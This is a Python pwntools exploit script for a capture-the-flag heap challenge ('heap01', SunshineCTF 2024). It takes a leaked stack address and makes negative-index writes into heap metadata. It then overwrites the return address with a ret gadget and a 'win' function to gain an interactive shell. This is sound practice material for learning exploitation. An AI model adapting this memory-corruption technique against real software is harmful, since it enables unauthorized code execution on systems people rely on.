#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./heap01_patched")
# exe = ptr.ELF("./heap01")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.35.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("2024.sunshinectf.games", 24006)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    ret = next(exe.gadget("ret;"))
    win = unwrap(exe.symbol("win"))

    io.sendline(b"1")  # leak
    io.recvuntil(b"Do you want a leak? \n")
    ret_addr = int(io.recvline().strip(b"\n"), 16) + 0x28
    ptr.logger.info(f"ret_addr: {hex(ret_addr)}")

    io.sendline(str(0x38).encode())  # size

    io.sendline(str(-0x1210 // 8).encode())  # index
    io.sendline(str(ret_addr - 0x8).encode())  # value

    io.sendline(str(-0x12A0 // 8).encode())  # index
    io.sendline(str(0x414100000000).encode())  # value

    io.sendline(b"0")
    io.sendline(str(ret).encode())
    io.sendline(str(win).encode())

    io.interactive()
    return


if __name__ == "__main__":
    main()
